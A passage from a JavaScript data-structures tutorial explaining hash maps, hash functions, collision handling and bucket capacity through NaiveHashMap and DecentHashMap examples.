<th>Worst</th>
</tr>
</thead>
<tbody>
<tr>
<td>Access (<code>Array.[]</code>)</td>
<td><em><code>O(1)</code></em></td>
</tr>
<tr>
<td>Insert head (<code>Array.unshift</code>)</td>
<td><em><code>O(n)</code></em></td>
</tr>
<tr>
<td>Insert tail (<code>Array.push</code>)</td>
<td><em><code>O(1)</code></em></td>
</tr>
<tr>
<td>Search (for value)</td>
<td><em><code>O(n)</code></em></td>
</tr>
<tr>
<td>Delete (<code>Array.splice</code>)</td>
<td><em><code>O(n)</code></em></td>
</tr>
</tbody>
</table>
<h1 id="HashMaps">HashMaps<a href="#HashMaps" class="headerlink" title="HashMaps"></a></h1><!-- https://en.wikipedia.org/wiki/Hash_table -->
<!-- https://en.wikipedia.org/wiki/Associative_array -->
<!-- https://medium.com/front-end-hacking/es6-map-vs-object-what-and-when-b80621932373 -->
<p>HashMaps has many names like HashTable, HashMap, Map, Dictionary, Associative Arrays and so on. The concept is the same while the implementation might change slightly.</p>
<blockquote>
<p>Hashtable is a data structure that <strong>maps</strong> keys to values</p>
</blockquote>
<p>Going back to the drawer analogy, bins have a label rather than a number.</p>
<p><strong>HashMap is like a drawer that stores things on bins and label them</strong>
<img src="/images/hashmap-drawer.jpg" title="HashMap is like a drawer that stores things on bins and label them"></p>
<p>In this example, if you are looking for a toy, you don‚Äôt have to open the bin 1, 2, and 3 to see what‚Äôs inside. You go directly to the bin labled as ‚Äútoys‚Äù. That‚Äôs a huge gain! Search time goes from <em>O(n)</em> to <em>O(1)</em>.</p>
<p>Numbers were the array indexes, and labels are the key for the HashMap‚Äôs values. Internally, the keys get translated into indexes using a <em>hash function</em>.</p>
<!-- http://apprize.info/javascript/20lessons/20lessons.files/image052.jpg -->
<p>There are at least two ways to implement hashmap:</p>
<ol>
<li><strong>Array</strong>: Using a hash function to map a key to the array index value. Worst: <code>O(n)</code>, Average: <code>O(1)</code></li>
<li><strong>Binary Search Tree</strong>: using a self-balancing binary search tree to look up for values (more on this later). Worst: <em><code>O(log n)</code></em>, Average: <em><code>O(log n)</code></em>.</li>
</ol>
<p>We are going to cover Trees &amp; Binary Search Trees so don‚Äôt worry too much about it for now. The most common implementation of Maps is using a  <strong>array</strong> and <code>hash</code> function. So, we are going to implement that going forward.</p>
<p><strong>HashMap implemented with an array</strong>
<img src="/images/hash-map.jpg" title="HashMap: hash function translates keys into bucket (array) indexes"></p>
<p>As you can see in the image, each key gets translated into a <strong>hash code</strong>. Since the array size is limited (e.g. 10), we have to loop through the available buckets using modulus function. In the buckets we store the key/value pair and if there‚Äôs more than one we use a collection to hold them.</p>
<p>We are going to cover each of the HashMap components in details. Let‚Äôs start with the <strong>hash function</strong>.</p>
<!--  ## HashMap vs. Array

Why go through the trouble of converting the key into an index and not using an array directly you might ask. Well, the main difference is that the Array's index doesn't have any relationship with the data. You have to know where your data is.

Let's say you want to count how many times words are used in a text. How would you implement that?

1. You can use two arrays (let's call it `A` and `B`). One for storing the word and another for storing how many times they have seen (frequency).
2. You can use a HashMap. They *`key`* is the word, and the *`value`* is the frequency of the word.

What is the runtime of the approach #1 using **two arrays**? If we say, the number of words in the text is *`n`*. Then we have to `search` if the word in the array `A`  and then increment the value on array `B` matching that index. We would have two loops 1) to go through each word and 2) searching in the array B. The runtime would be <code>O(n<sup>2</sup>)</code>.

What is the runtime of the approach #2 using a **HashMap**? Well, we iterate through each word on the text and increment the value if there is something there or set it to 1 if that word is seen for the first time. The runtime would be \`O(n)\` which is much more performant than approach #1.

Differences between HashMap and Array
- Search on an array is *O(n)* while on a HashMap is *O(1)*
- Arrays can have duplicate values, while HashMap cannot have duplicated keys (but it can have duplicate values.)
- The array has a key (index) that is always a number from 0 to max value, while in a HashMap you have control of the key and it can be whatever you want: number, string, or symbol.
 -->
<h2 id="Hash-Function">Hash Function<a href="#Hash-Function" class="headerlink" title="Hash Function"></a></h2><p>The first step to implement a HashMap is to have a hash function. This function will map every key to its value.</p>
<blockquote>
<p>The <strong>perfect hash function</strong> is the one that for every key it assigns a unique index.</p>
</blockquote>
<p>Ideal hashing algorithms allow a <em>constant time</em> access/lookup. However, it‚Äôs hard to achieve a perfect hashing function in practice. You might have the case where two different keys yields on the same index: <em>collision</em>.</p>
<p>Collision in hashmaps is unavoidable when using an array-like underlying data structure. So one way to deal with collsions is to store multiple values in the same bucket. When we try to access the key‚Äôs value and found various values we iterate over the values <em>O(n)</em>. However, in most implementations, the hash adjust the size dynamically to avoid too many collisions so we can say that the <strong>amortized</strong> lookup time is <em>O(1)</em>. We are going to explain what we mean by amortized runtime later on this post with an example.</p>
<h2 id="Naive-HashMap-implementation">Na√Øve HashMap implementation<a href="#Naive-HashMap-implementation" class="headerlink" title="Na√Øve HashMap implementation"></a></h2><p><a id="NaiveHashMap"></a>
A very simple (and bad) hash function would this one:</p>
<figure class="highlight js"><figcaption><span>Naive HashMap Implementation</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/hash-maps/hash-map-1.js" target="_blank" rel="noopener">full code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NaiveHashMap</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(initialCapacity = 2) &#123;</span><br><span class="line">    <span class="keyword">this</span>.buckets = <span class="keyword">new</span> <span class="built_in">Array</span>(initialCapacity);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set(key, value) &#123;</span><br><span class="line">    <span class="keyword">const</span> index = <span class="keyword">this</span>.getIndex(key);</span><br><span class="line">    <span class="keyword">this</span>.buckets[index] = value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  get(key) &#123;</span><br><span class="line">    <span class="keyword">const</span> index = <span class="keyword">this</span>.getIndex(key);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.buckets[index];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hash(key) &#123;</span><br><span class="line marked">    <span class="keyword">return</span> key.toString().length;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  getIndex(key) &#123;</span><br><span class="line">    <span class="keyword">const</span> indexHash = <span class="keyword">this</span>.hash(key);</span><br><span class="line marked">    <span class="keyword">const</span> index = indexHash % <span class="keyword">this</span>.buckets.length;</span><br><span class="line">    <span class="keyword">return</span> index;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We are using <code>buckets</code> rather than drawer/bins but you get the idea :)</p>
<p>We have an initial capacity of 2 (two buckets). However, we want to store any number of elements on them. We use modulus <code>%</code> to loop through the number of available buckets.</p>
<p>Take a look at our hash function in line 18. We are going to talk about it in a bit. First, let‚Äôs see how we use our new HashMap!</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Usage:</span></span><br><span class="line"><span class="keyword">const</span> assert = <span class="built_in">require</span>(<span class="string">'assert'</span>);</span><br><span class="line"><span class="keyword">const</span> hashMap = <span class="keyword">new</span> NaiveHashMap();</span><br><span class="line"></span><br><span class="line">hashMap.set(<span class="string">'cat'</span>, <span class="number">2</span>);</span><br><span class="line">hashMap.set(<span class="string">'rat'</span>, <span class="number">7</span>);</span><br><span class="line">hashMap.set(<span class="string">'dog'</span>, <span class="number">1</span>);</span><br><span class="line">hashMap.set(<span class="string">'art'</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(hashMap.buckets);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  bucket #0: &lt;1 empty item&gt;,</span></span><br><span class="line"><span class="comment">  bucket #1: 8</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">assert.equal(hashMap.get(<span class="string">'art'</span>), <span class="number">8</span>); <span class="comment">// this one is ok</span></span><br><span class="line">assert.equal(hashMap.get(<span class="string">'cat'</span>), <span class="number">8</span>); <span class="comment">// got overwritten by art üò±</span></span><br><span class="line">assert.equal(hashMap.get(<span class="string">'rat'</span>), <span class="number">8</span>); <span class="comment">// got overwritten by art üò±</span></span><br><span class="line">assert.equal(hashMap.get(<span class="string">'dog'</span>), <span class="number">8</span>); <span class="comment">// got overwritten by art üò±</span></span><br></pre></td></tr></table></figure>
<p>This <code>Map</code> allow us to <code>set</code> a key and a value and then <code>get</code> the value using a <code>key</code>. The key part is the <code>hash</code> function let‚Äôs see multiple implementations to see how it affects the performance of the Map.</p>
<p>Can you tell what‚Äôs wrong with <code>NaiveHashMap</code> before expanding the answer below?</p>
<details>
 <summary>What is wrong with <code>NaiveHashMap</code> is that‚Ä¶</summary>

<br><br>
<strong>1)</strong> <strong>Hash function</strong> generates many duplicates. E.g.

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hash(<span class="string">'cat'</span>) <span class="comment">// 3</span></span><br><span class="line">hash(<span class="string">'dog'</span>) <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>

This will cause a lot of collisions.

<br><br>
<strong>2)</strong> <strong>Collisions</strong> are not handled at all. Both <code>cat</code> and <code>dog</code> will overwrite each other on the position 3 of the array (bucket#1).

<br><br>
<strong>3)</strong> <strong>Size of the array</strong> even if we get a better hash function we will get duplicates because the array has a size of 3 which less than the number of elements that we want to fit. We want to have an initial capacity that is well beyond what we need to fit.
</details>

<p>Did you guess any? ‚òùÔ∏è</p>
<h2 id="Improving-Hash-Function">Improving Hash Function<a href="#Improving-Hash-Function" class="headerlink" title="Improving Hash Function"></a></h2><blockquote>
<p>The primary purpose of a HashMap is to reduce the search/access time of an Array from <em><code>O(n)</code></em> to <em><code>O(1)</code></em>.</p>
</blockquote>
<p>For that we need:</p>
<ol>
<li>A proper hash function that produces as few collisions as possible.</li>
<li>An array that is big enough to hold all the required values.</li>
</ol>
<p>Let‚Äôs give it another shot to our hash function. Instead of using the length of the string, let‚Äôs sum each character <a href="https://simple.wikipedia.org/wiki/ASCII" target="_blank" rel="noopener">ascii code</a>.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hash(key) &#123;</span><br><span class="line">  <span class="keyword">let</span> hashValue = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> stringKey = key.toString();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; stringKey.length; index++) &#123;</span><br><span class="line">    <span class="keyword">const</span> charCode = stringKey.charCodeAt(index);</span><br><span class="line">    hashValue += charCode;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> hashValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Let‚Äôs try again:
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hash(<span class="string">'cat'</span>) <span class="comment">// 312  (c=99 + a=97 + t=116)</span></span><br><span class="line">hash(<span class="string">'dog'</span>) <span class="comment">// 314 (d=100 + o=111 + g=103)</span></span><br></pre></td></tr></table></figure></p>
<p>This one is better! Because words with the same length has different code.</p>
<p>Howeeeeeeeeever, there‚Äôs still an issue! Because <code>rat</code> and <code>art</code> are both 327, <strong>collision!</strong> üí•</p>
<p>We can fix that by offsetting the sum with the position:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hash(key) &#123;</span><br><span class="line">  <span class="keyword">let</span> hashValue = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> stringKey = <span class="string">`<span class="subst">$&#123;key&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; stringKey.length; index++) &#123;</span><br><span class="line">    <span class="keyword">const</span> charCode = stringKey.charCodeAt(index);</span><br><span class="line">    hashValue += charCode &lt;&lt; (index * <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> hashValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Now let‚Äôs try again, this time with hex numbers so we can see the offset.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// r = 114 or 0x72; a = 97 or 0x61; t = 116 or 0x74</span></span><br><span class="line">hash(<span class="string">'rat'</span>); <span class="comment">// 7,627,122 (r: 114 * 1 + a: 97 * 256 + t: 116 * 65,536) or in hex: 0x726174 (r: 0x72 + a: 0x6100 + t: 0x740000)</span></span><br><span class="line">hash(<span class="string">'art'</span>); <span class="comment">// 7,631,457 or 0x617274</span></span><br></pre></td></tr></table></figure>
<p>What about different types?</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hash(<span class="number">1</span>); <span class="comment">// 49</span></span><br><span class="line">hash(<span class="string">'1'</span>); <span class="comment">// 49</span></span><br><span class="line"></span><br><span class="line">hash(<span class="string">'1,2,3'</span>); <span class="comment">// 741485668</span></span><br><span class="line">hash([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]); <span class="comment">// 741485668</span></span><br><span class="line"></span><br><span class="line">hash(<span class="string">'undefined'</span>) <span class="comment">// 3402815551</span></span><br><span class="line">hash(<span class="literal">undefined</span>) <span class="comment">// 3402815551</span></span><br></pre></td></tr></table></figure>
<p>Houston, we still have a problem!! Different values types shouldn‚Äôt return the same hash code!</p>
<p>How can we solve that?</p>
<p>One way is taking into account the key <code>type</code> into the hash function.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hash(key) &#123;</span><br><span class="line">  <span class="keyword">let</span> hashValue = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> stringTypeKey = <span class="string">`<span class="subst">$&#123;key&#125;</span><span class="subst">$&#123;<span class="keyword">typeof</span> key&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; stringTypeKey.length; index++) &#123;</span><br><span class="line">    <span class="keyword">const</span> charCode = stringTypeKey.charCodeAt(index);</span><br><span class="line">    hashValue += charCode &lt;&lt; (index * <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> hashValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Let‚Äôs test that again:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(hash(<span class="number">1</span>)); <span class="comment">// 1843909523</span></span><br><span class="line"><span class="built_in">console</span>.log(hash(<span class="string">'1'</span>)); <span class="comment">// 1927012762</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(hash(<span class="string">'1,2,3'</span>)); <span class="comment">// 2668498381</span></span><br><span class="line"><span class="built_in">console</span>.log(hash([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])); <span class="comment">// 2533949129</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(hash(<span class="string">'undefined'</span>)); <span class="comment">// 5329828264</span></span><br><span class="line"><span class="built_in">console</span>.log(hash(<span class="literal">undefined</span>)); <span class="comment">// 6940203017</span></span><br></pre></td></tr></table></figure>
<p><a id="DecentHashMap"></a>
Yay!!! üéâ we have a much better hash function!</p>
<p>We also can change the initial capacity of the array to minimize collisions. Let‚Äôs put all of that together in the next section.</p>
<h2 id="Decent-HashMap-Implementation">Decent HashMap Implementation<a href="#Decent-HashMap-Implementation" class="headerlink" title="Decent HashMap Implementation"></a></h2><p>Using our optimized hash function we can now do much better.</p>
<p>We could still have collisions so let‚Äôs implement something to handle them
<!-- However, it doesn't matter how good our hash function as long as we use a limited size bucket we would have collisions.  So, we have to account for that and handle it gracefully.  --></p>
<p>Let‚Äôs make the following improvements to our HashMap implementation:</p>
<ul>
<li><strong>Hash function</strong> that checks types and character orders to minimize collisions.</li>
<li><strong>Handle collisions</strong> by appending values to a list. We also added a counter to keep track of them.</li>
</ul>
<figure class="highlight js"><figcaption><span>Decent HashMap Implementation</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/lib/data-structures/hash-maps/hash-map-2.js" target="_blank" rel="noopener">full code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DecentHashMap</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>(initialCapacity = 2) &#123;</span><br><span class="line">    <span class="keyword">this</span>.buckets = <span class="keyword">new</span> <span class="built_in">Array</span>(initialCapacity);</span><br><span class="line">    <span class="keyword">this</span>.collisions = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set(key, value) &#123;</span><br><span class="line">    <span class="keyword">const</span> bucketIndex = <span class="keyword">this</span>.getIndex(key);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.buckets[bucketIndex]) &#123;</span><br><span class="line">      <span class="keyword">this</span>.buckets[bucketIndex].push(&#123;key, value&#125;);</span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">this</span>.buckets[bucketIndex].length &gt; <span class="number">1</span>) &#123; <span class="keyword">this</span>.collisions++; &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.buckets[bucketIndex] = [&#123;key, value&#125;];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line marked"></span><br><span class="line">  get(key) &#123;</span><br><span class="line">    <span class="keyword">const</span> bucketIndex = <span class="keyword">this</span>.getIndex(key);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> arrayIndex = <span class="number">0</span>; arrayIndex &lt; <span class="keyword">this</span>.buckets[bucketIndex].length; arrayIndex++) &#123;</span><br><span class="line">      <span class="keyword">const</span> entry = <span class="keyword">this</span>.buckets[bucketIndex][arrayIndex];</span><br><span class="line marked">      <span class="keyword">if</span>(entry.key === key) &#123;</span><br><span class="line">        <span class="keyword">return</span> entry.value</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hash(key) &#123;</span><br><span class="line">    <span class="keyword">let</span> hashValue = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> stringTypeKey = <span class="string">`<span class="subst">$&#123;key&#125;</span><span class="subst">$&#123;<span class="keyword">typeof</span> key&#125;</span>`</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; stringTypeKey.length; index++) &#123;</span><br><span class="line">      <span class="keyword">const</span> charCode = stringTypeKey.charCodeAt(index);</span><br><span class="line">      hashValue += charCode &lt;&lt; (index * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashValue;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  getIndex(key) &#123;</span><br><span class="line">    <span class="keyword">const</span> indexHash = <span class="keyword">this</span>.hash(key);</span><br><span class="line">    <span class="keyword">const</span> index = indexHash % <span class="keyword">this</span>.buckets.length;</span><br><span class="line">    <span class="keyword">return</span> index;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Let‚Äôs use it and see how it perform:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Usage:</span></span><br><span class="line"><span class="keyword">const</span> assert = <span class="built_in">require</span>(<span class="string">'assert'</span>);</span><br><span class="line"><span class="keyword">const</span> hashMap = <span class="keyword">new</span> DecentHashMap();</span><br><span class="line"></span><br><span class="line">hashMap.set(<span class="string">'cat'</span>, <span class="number">2</span>);</span><br><span class="line">hashMap.set(<span class="string">'rat'</span>, <span class="number">7</span>);</span><br><span class="line">hashMap.set(<span class="string">'dog'</span>, <span class="number">1</span>);</span><br><span class="line">hashMap.set(<span class="string">'art'</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'collisions: '</span>, hashMap.collisions); <span class="comment">// 2</span></span><br><span class="line"><span class="built_in">console</span>.log(hashMap.buckets);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  bucket #0: [ &#123; key: 'cat', value: 2 &#125;, &#123; key: 'art', value: 8 &#125; ]</span></span><br><span class="line"><span class="comment">  bucket #1: [ &#123; key: 'rat', value: 7 &#125;, &#123; key: 'dog', value: 1 &#125; ]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">assert.equal(hashMap.get(<span class="string">'art'</span>), <span class="number">8</span>); <span class="comment">// this one is ok</span></span><br><span class="line">assert.equal(hashMap.get(<span class="string">'cat'</span>), <span class="number">2</span>); <span class="comment">// Good. Didn't got overwritten by art</span></span><br><span class="line">assert.equal(hashMap.get(<span class="string">'rat'</span>), <span class="number">7</span>); <span class="comment">// Good. Didn't got overwritten by art</span></span><br><span class="line">assert.equal(hashMap.get(<span class="string">'dog'</span>), <span class="number">1</span>); <span class="comment">// Good. Didn't got overwritten by art</span></span><br></pre></td></tr></table></figure>
<p>This <code>DecentHashMap</code> gets the job done, but still, there are some issues. We are using a decent hash function that doesn‚Äôt produce duplicate values, and that‚Äôs great. However, we have two values in <code>bucket#0</code> and two more in <code>bucket#1</code>. How is that possible??</p>
<p>Since we are using a limited bucket size of 2, we use modulus <code>%</code> to loop through the number of available buckets. So, even if the hash code is different all values will fit on the size of the array: bucket#0 or bucket#1.</p>
<!-- [{"key":"cat","hash":3789411390},{"key":"dog","hash":3788563007},{"key":"rat","hash":3789411405},{"key":"art","hash":3789415740}] -->
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hash(<span class="string">'cat'</span>) =&gt; <span class="number">3789411390</span>; <span class="function"><span class="params">bucketIndex</span> =&gt;</span> <span class="number">3789411390</span> % <span class="number">2</span> = <span class="number">0</span></span><br><span class="line">hash(<span class="string">'art'</span>) =&gt; <span class="number">3789415740</span>; <span class="function"><span class="params">bucketIndex</span> =&gt;</span> <span class="number">3789415740</span> % <span class="number">2</span> = <span class="number">0</span></span><br><span class="line">hash(<span class="string">'dog'</span>) =&gt; <span class="number">3788563007</span>; <span class="function"><span class="params">bucketIndex</span> =&gt;</span> <span class="number">3788563007</span> % <span class="number">2</span> = <span class="number">1</span></span><br><span class="line">hash(<span class="string">'rat'</span>) =&gt; <span class="number">3789411405</span>; <span class="function"><span class="params">bucketIndex</span> =&gt;</span> <span class="number">3789411405</span> % <span class="number">2</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>So naturally we have increased the initial capacity but by how much? Let ‚Äòs see how the initial size affects the hash map performance.</p>
<p>If we have an initial capacity of <code>1</code>. All the values will go into one bucket (<code>bucket#0</code>), and it won‚Äôt be any better than searching a value in a simple array <em><code>O(n)</code></em>.</p>
<p>Let‚Äôs say that we start with an initial capacity set to 10:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> hashMapSize10 = <span class="keyword">new</span> DecentHashMap(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">hashMapSize10.set(<span class="string">'cat'</span>, <span class="number">2</span>);</span><br><span class="line">hashMapSize10.set(<span class="string">'rat'</span>, <span class="number">7</span>);</span><br><span class="line">hashMapSize10.set(<span class="string">'dog'</span>, <span class="number">1</span>);</span><br><span class="line">hashMapSize10.set(<span class="string">'art'</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'collisions: '</span>, hashMapSize10.collisions); <span class="comment">// 1</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'hashMapSize10\n'</span>, hashMapSize10.buckets);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  bucket#0: [ &#123; key: 'cat', value: 2 &#125;, &#123; key: 'art', value: 8 &#125; ],</span></span><br><span class="line"><span class="comment">            &lt;4 empty items&gt;,</span></span><br><span class="line"><span class="comment">  bucket#5: [ &#123; key: 'rat', value: 7 &#125; ],</span></span><br><span class="line"><span class="comment">            &lt;1 empty item&gt;,</span></span><br><span class="line"><span class="comment">  bucket#7: [ &#123; key: 'dog', value: 1 &#125; ],</span></span><br><span class="line"><span class="comment">            &lt;2 empty items&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>Another way to see this</p>
<img src="/images/hash-map.jpg" title="HashMap: hash function translates keys into bucket (array) indexes">
<p>As you can see, we reduced the number of collisions (from 2 to 1) by increasing the initial capacity of the hash map.</p>
<p>Let‚Äôs try with a bigger capacity üíØ:</p>
